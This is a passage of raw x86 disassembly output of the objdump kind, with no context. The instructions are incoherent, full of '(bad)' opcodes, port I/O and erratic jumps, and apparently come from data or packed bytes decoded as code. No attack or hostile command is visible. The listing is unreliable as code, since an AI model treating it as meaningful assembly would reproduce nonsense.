  4286dc:	mov    al,ds:0xeeb7740d
  4286e1:	jmp    0x4286c8
  4286e3:	and    eax,0x3e30980c
  4286e8:	push   esp
  4286e9:	push   es
  4286ea:	adc    BYTE PTR [ecx+0x8f2944],ah
  4286f0:	pop    esp
  4286f1:	out    0x15,al
  4286f3:	ror    DWORD PTR [esi+esi*2+0x3b],0xee
  4286f8:	dec    edx
  4286f9:	(bad)  
  4286fa:	jle    0x4286d3
  4286fc:	xor    bl,ch
  4286fe:	fisttp QWORD PTR [ecx-0x5eddc2fe]
  428704:	jb     0x4286d9
  428706:	sub    esp,edi
  428708:	in     al,0xb0
  42870a:	pop    esi
  42870b:	imul   esp,DWORD PTR [esi+edx*8],0x842fd1af
  428712:	fisttp DWORD PTR [eax-0x25]
  428715:	popf   
  428716:	test   BYTE PTR [ebp-0x276db9d7],bl
  42871c:	lock cmp DWORD PTR [esi-0x2072b212],0x6e
  428724:	adc    edi,edx
  428726:	dec    edx
  428727:	or     edx,ecx
  428729:	imul   ebx,ebx,0x3d
  42872c:	jp     0x4286bd
  42872e:	out    dx,eax
  42872f:	mov    dl,0x47
  428731:	adc    eax,0x2a414610
  428736:	mov    BYTE PTR ds:0x7e6c7a9,bh
  42873c:	mov    eax,0x772f0f7c
  428741:	xchg   edx,eax
  428742:	jne    0x42870f
  428744:	sbb    eax,0x16e56eba
  428749:	pop    ds
  42874a:	fidiv  WORD PTR [ebx-0x3e53d0ea]
  428750:	mov    ah,0x15
  428752:	dec    esi
  428753:	je     0x4287c1
  428755:	cwde   
  428756:	ins    DWORD PTR es:[edi],dx
  428757:	xchg   ebp,eax
  428758:	xor    DWORD PTR [edx+0x1f],esp
  42875b:	sbb    DWORD PTR [edx+edx*4],ebx
  42875e:	adc    eax,0xa7f33503
  428763:	in     eax,0xec
  428765:	fdivr  st(3),st
  428767:	lods   al,BYTE PTR ds:[esi]
  428768:	jecxz  0x428746
  42876a:	sub    eax,0x9804809b
  42876f:	and    ah,BYTE PTR [edi]
  428771:	ror    BYTE PTR [edx+0x60],cl
  428774:	retf   0x693c
  428777:	add    ebx,edx
  428779:	repz aad 0xb1
  42877c:	sbb    ah,BYTE PTR [esi+0x21]
  42877f:	sti    
  428780:	add    BYTE PTR [eax],al
  428782:	std    
  428783:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428789:	stc    
  42878a:	int    0xea
  42878c:	xor    al,al
  42878e:	pushf  
  42878f:	sahf   
  428790:	test   DWORD PTR [edx],eax
  428792:	add    cl,bh
  428794:	add    DWORD PTR [eax],eax
  428796:	add    eax,DWORD PTR es:[eax]
  428799:	add    bh,cl
  42879b:	jmp    0x12d5:0x8ccdaee4
  4287a2:	inc    esp
  4287a3:	push   ebp
  4287a4:	fisub  DWORD PTR [edx-0x77]
  4287a7:	imul   edx,DWORD PTR [ecx-0x5a133d78],0x60407bd6
  4287b1:	(bad)  
  4287b3:	ins    BYTE PTR es:[edi],dx
  4287b4:	push   edi
  4287b5:	push   ss
  4287b6:	out    dx,al
  4287b7:	out    dx,al
  4287b8:	aad    0xa1
  4287ba:	cmc    
  4287bb:	push   edx
  4287bc:	push   0x7f
  4287be:	adc    al,0x4a
  4287c1:	pop    ebp
  4287c2:	cwde   
  4287c3:	(bad)  
  4287c4:	(bad)  [ebx+edi*4+0x3f34c006]
  4287cb:	loopne 0x4287c1
  4287cd:	arpl   WORD PTR [ebp+0x33],sp
  4287d0:	and    DWORD PTR [ecx-0x1b],edi
  4287d3:	add    ebp,esi
  4287d5:	mov    al,0xf8
  4287d7:	xlat   BYTE PTR ds:[ebx]
  4287d8:	test   BYTE PTR [edi-0x315cb31],bl
  4287de:	sti    
  4287df:	inc    edi
  4287e0:	sbb    ebp,esi
  4287e2:	in     eax,dx
  4287e3:	fisttp DWORD PTR ds:0x1ad6d757
  4287e9:	sbb    al,0x8f
  4287eb:	pop    esp
  4287ec:	clc    
  4287ed:	nop
  4287ee:	sbb    bl,BYTE PTR [eax-0x66]
  4287f1:	push   ss
  4287f2:	inc    esp
  4287f3:	sub    ebp,DWORD PTR [ecx-0x2294f440]
  4287f9:	jne    0x42881c
  4287fb:	fwait
  4287fc:	mov    cl,0xa0
  4287fe:	dec    ebp
  4287ff:	into   
  428800:	jo     0x428880
  428802:	mov    BYTE PTR [esi],dl
  428804:	sbb    ch,BYTE PTR [ebp-0x6a4a2f58]
  42880a:	dec    esi
  42880b:	loopne 0x428860
  42880d:	aaa    
  42880e:	jmp    0x4287a7
  428810:	xchg   esp,eax
  428811:	test   DWORD PTR [eax],0x857d10a2
  428817:	sbb    al,0x19
  428819:	push   0x801f4efc
  42881e:	add    eax,0xfd884d5f
  428823:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428825:	into   
  428826:	lods   al,BYTE PTR ds:[esi]
  428827:	xchg   ebp,eax
  428828:	sub    esi,0xfffffff0
  42882b:	push   ss
  42882c:	and    al,0xe9
  42882e:	inc    ebp
  42882f:	fs ds std 
  428832:	push   cs
  428833:	xchg   DWORD PTR [bp-0x5d],ebx
  428837:	xchg   ah,cl
  428839:	xor    eax,0xe589c5fc
  42883e:	pop    ecx
  42883f:	imul   esi,ebx,0x95cf9af4
  428845:	in     eax,dx
  428846:	jns    0x428805
  428848:	ss scas al,BYTE PTR es:[edi]
  42884a:	mov    cs,WORD PTR [ebx+0x53]
  42884d:	(bad)  
  42884e:	or     al,0xb9
  428850:	loopne 0x4288ae
  428852:	(bad)  [esi+0x3c]
  428855:	pop    esp
  428856:	dec    eax
  428857:	mov    ?,WORD PTR [eax]
  428859:	jmp    0x4288b6
  42885b:	pop    ebp
  42885c:	out    dx,eax
  42885d:	xor    BYTE PTR [edi-0x21],0x75
  428861:	inc    ebx
  428862:	and    ecx,edx
  428864:	add    eax,0xe426d70a
  428869:	mov    esi,0x28eb94f9
  42886e:	lea    edx,[ecx+ecx*4-0x214f6b9c]
  428875:	cmp    DWORD PTR [edi-0x40bcb53],ecx
  42887b:	fstp   QWORD PTR ds:0x74dd1be4
  428881:	push   0xffffffdc
  428883:	sbb    BYTE PTR [esi],ah
  428885:	mov    ds:0x832dc3a6,al
  42888a:	jecxz  0x42890a
  42888c:	xchg   edx,eax
  42888d:	data16 cmp dh,BYTE PTR [ebx+ebx*2-0x48]
  428892:	stc    
  428893:	lods   eax,DWORD PTR ds:[esi]
  428894:	lahf   
  428895:	sti    
  428896:	sbb    al,0x95
  428898:	jge    0x428827
  42889a:	push   edx
  42889b:	pop    ebx
  42889c:	stos   BYTE PTR es:[edi],al
  42889d:	add    DWORD PTR [esp+ebx*8+0x5d28afd],edi
  4288a4:	push   ebp
  4288a5:	inc    ebx
  4288a6:	and    esp,DWORD PTR [ebx]
  4288a8:	pop    ebx
  4288a9:	scas   eax,DWORD PTR es:[edi]
  4288aa:	stos   BYTE PTR es:[edi],al
  4288ab:	(bad)  
  4288ac:	gs int3 
  4288ae:	ret    
  4288af:	inc    ebx
  4288b0:	pop    edx
  4288b1:	es dec ebp
  4288b3:	enter  0x8efc,0x72
  4288b7:	sub    DWORD PTR [edx],0xffffffb1
  4288ba:	adc    DWORD PTR [esi+0x12],edi
  4288bd:	push   ebp
  4288be:	or     bl,cl
  4288c0:	das    
  4288c1:	int    0xd1
  4288c3:	pop    ds
  4288c4:	test   eax,0xb4e84426
  4288ca:	ins    DWORD PTR es:[edi],dx
  4288cb:	iret   
  4288cc:	ss aaa 
  4288ce:	mov    ebp,0x2aeeecfd
  4288d3:	adc    al,0x6a
  4288d5:	jbe    0x42889f
  4288d7:	adc    bh,dh
  4288d9:	leave  
  4288da:	xor    edx,DWORD PTR [edi+eax*4-0x39c54df6]
  4288e1:	jo     0x4288ef
  4288e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4288e4:	add    eax,0xf5811080
  4288e9:	fist   WORD PTR es:[edx+0x7b324090]
  4288f0:	jg     0x4288c2
  4288f2:	mov    DWORD PTR [ebp*8+0x12493887],0xf7d85ac2
  4288fd:	daa    
  4288fe:	pop    eax
  4288ff:	jle    0x4288b9
  428901:	adc    bl,BYTE PTR [ecx+0x4a]
  428904:	adc    BYTE PTR [edi],bh
  428906:	lods   eax,DWORD PTR ds:[esi]
  428907:	or     BYTE PTR [edi+eiz*4+0x3fce037a],0xd1
  42890f:	call   0x2040aa29
  428914:	or     BYTE PTR [ebp-0x39],0x81
  428918:	leave  
  428919:	popa   
  42891a:	push   esi
  42891b:	fisttp WORD PTR [ebx-0x40fd583]
  428921:	out    0xad,eax
  428923:	adc    edi,DWORD PTR [ebx+ebx*4]
  428926:	inc    esp
  428927:	inc    esi
  428928:	ins    DWORD PTR es:[edi],dx
  428929:	adc    DWORD PTR [eax],eax
  42892b:	jge    0x428999
  42892d:	push   eax
  42892e:	xchg   edx,eax
  42892f:	lods   eax,DWORD PTR ds:[esi]
  428930:	jbe    0x428959
  428932:	fwait
  428933:	rcl    bl,cl
  428935:	sub    bh,BYTE PTR cs:[ebp-0x4e]
  428939:	xchg   ecx,eax
  42893a:	sbb    esi,DWORD PTR [ebx-0x28b74e8f]
  428940:	mov    al,0xf3
  428942:	xor    eax,DWORD PTR [ebx-0x1]
  428945:	scas   al,BYTE PTR es:[edi]
  428946:	daa    
  428947:	sbb    eax,0x14baa512
  42894c:	push   0x508ff668
  428951:	pop    esi
  428952:	inc    edx
  428953:	das    
  428954:	and    esi,eax
  428956:	cdq    
  428957:	jne    0x428961
  428959:	stos   BYTE PTR es:[edi],al
  42895a:	cmp    eax,0x7b4540da
  42895f:	ins    DWORD PTR es:[edi],dx
  428960:	jecxz  0x42898c
  428962:	adc    ebp,ecx
  428964:	rol    BYTE PTR [edx],0xde
  428967:	leave  
  428968:	sub    esi,DWORD PTR [ebx+ebx*2-0x24]
  42896c:	mov    esp,0xd84c712c
  428971:	or     BYTE PTR [edx-0x34],ah
  428974:	mov    edi,0x4109139a
  428979:	add    edx,DWORD PTR [eax]
  42897b:	add    eax,0x31a94296
  428980:	js     0x42893e
  428982:	rcr    BYTE PTR [edi],0x54
  428985:	add    al,0x49
  428988:	pusha  
  428989:	ret    
  42898a:	mov    ?,esp
  42898c:	cmp    al,0xc8
  42898e:	mov    dl,0x68
  428990:	xor    eax,0xde1cf34f
  428995:	cmp    ch,ah
  428997:	scas   eax,DWORD PTR es:[edi]
  428998:	fisub  DWORD PTR [edi]
  42899a:	adc    DWORD PTR [edi-0x37ef52e],edi
  4289a0:	xor    DWORD PTR [esi+0x55],ebp
  4289a3:	into   
  4289a4:	stos   DWORD PTR es:[edi],eax
  4289a5:	call   0xa4ffa6d7
  4289aa:	mov    esi,DWORD PTR [ebp+0x1d]
  4289ad:	pushw  0x7e
  4289b0:	mov    esp,0x22ae7f6d
  4289b5:	lds    ebx,FWORD PTR [edx-0x61300489]
  4289bb:	sub    BYTE PTR [edi-0x6578c5db],al
  4289c1:	mov    ah,ch
  4289c3:	aad    0x38
  4289c5:	das    
  4289c6:	iret   
  4289c7:	fmul   DWORD PTR [ebp+eax*1-0x6f]
  4289cb:	mov    al,ds:0x95d8c3e7
  4289d0:	in     eax,dx
  4289d1:	ret    
  4289d2:	out    0x81,al
  4289d4:	jge    0x428a28
  4289d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289d7:	mov    al,ds:0xe5bc7fd8
  4289dc:	inc    edx
  4289dd:	ficom  DWORD PTR [edx+0x55]
  4289e0:	sub    ebx,0x38
  4289e3:	imul   ebp,DWORD PTR [ebp+ecx*4-0x6c],0x18c7225a
  4289eb:	lock and al,0x20
  4289ee:	lahf   
  4289ef:	adc    bh,BYTE PTR [eax+0x25]
  4289f2:	push   edx
  4289f3:	into   
  4289f4:	and    DWORD PTR ds:0x3284bac6,0x6d
  4289fb:	jbe    0x428a3c
  4289fd:	outs   dx,DWORD PTR ds:[esi]
  4289fe:	mov    edi,0xb4982876
  428a03:	inc    ecx
  428a04:	out    0x9b,al
  428a06:	xchg   esi,eax
  428a07:	in     eax,dx
  428a08:	daa    
  428a09:	jp     0x4289e9
  428a0b:	mov    bh,0xf8
  428a0d:	es (bad) 
  428a0f:	pop    edx
  428a10:	in     al,0x5a
  428a12:	add    BYTE PTR [eiz*4-0x744032a0],ch
  428a19:	je     0x4289a5
  428a1b:	cmp    ecx,ebp
  428a1d:	mov    eax,0x339f26d7
  428a22:	jge    0x4289c0
  428a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a25:	jnp    0x428a2e
  428a27:	add    bl,BYTE PTR [eax*2+0x7a954bcd]
  428a2e:	mov    ebx,0xec0a676c
  428a33:	and    dh,dh
  428a35:	push   ecx
  428a36:	lock push es
  428a38:	das    
  428a39:	aam    0x8
  428a3b:	cmp    eax,DWORD PTR [edi+0x7a]
  428a3e:	sub    BYTE PTR [esi+0x27],bl
  428a41:	dec    esi
  428a42:	or     edi,esi
  428a44:	xchg   edx,eax
  428a45:	int3   
  428a46:	aad    0xb
  428a48:	push   esp
  428a49:	adc    al,0xe2
  428a4b:	icebp  
  428a4c:	mov    edx,ebp
  428a4e:	stos   DWORD PTR es:[edi],eax
  428a4f:	push   ebp
  428a50:	std    
  428a51:	aaa    
  428a52:	mov    edx,0xa8380999
  428a57:	in     al,dx
  428a58:	pusha  
  428a59:	xor    edx,ecx
  428a5b:	fnstenv [eax-0x68aa5d1b]
  428a61:	sub    DWORD PTR [esi+0x7cce636c],ecx
  428a67:	and    eax,0xf057d177
  428a6c:	jno    0x428a06
  428a6e:	aas    
  428a6f:	(bad)  
  428a70:	pusha  
  428a71:	xor    eax,0xa8193786
  428a76:	sub    al,BYTE PTR [edi+0x545e157]
  428a7c:	out    0x38,al
  428a7e:	lods   al,BYTE PTR gs:[esi]
  428a80:	shr    BYTE PTR [esi-0xf],cl
  428a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a84:	iret   
  428a85:	jp     0x428a77
  428a87:	push   esp
  428a88:	xchg   ebx,eax
  428a89:	outs   dx,BYTE PTR ds:[esi]
  428a8a:	mov    esp,0xd418e0b4
  428a8f:	mov    esi,0xb7ccdd66
  428a94:	mov    bh,0x26
  428a96:	test   DWORD PTR cs:[edi-0xe8d457e],ebx
  428a9d:	gs loopne 0x428afb
  428aa0:	xchg   edi,eax
  428aa1:	je     0x428a8f
  428aa3:	repnz fwait
  428aa5:	push   sp
  428aa7:	test   DWORD PTR [esi+edi*8],ebp
  428aaa:	sub    DWORD PTR [edx-0x4851dd7f],0x1e
  428ab1:	(bad)  
  428ab2:	pop    ebp
  428ab3:	or     ebx,DWORD PTR [ecx-0x158ff057]
  428ab9:	faddp  st(0),st
  428abb:	dec    ecx
  428abc:	clc    
  428abd:	outs   dx,DWORD PTR ds:[esi]
  428abe:	inc    eax
  428abf:	mov    al,0x0
  428ac1:	add    BYTE PTR [ecx-0x7d39faf],ch
  428ac7:	cmp    eax,0x8ba9d5ed
  428acc:	mov    ebx,0x3439ad92
  428ad1:	imul   esp,DWORD PTR [esi],0x1b0001fc
  428ad7:	add    BYTE PTR [eax],al
  428ad9:	add    BYTE PTR ds:0x68aef13,bl
  428adf:	cmp    al,0x78
  428ae1:	jae    0x428a98
  428ae3:	xor    DWORD PTR ds:0xf8c30396,0xc7f7aab0
  428aed:	stos   DWORD PTR es:[edi],eax
  428aee:	or     BYTE PTR [esi+eiz*4+0x196252d],ch
	...
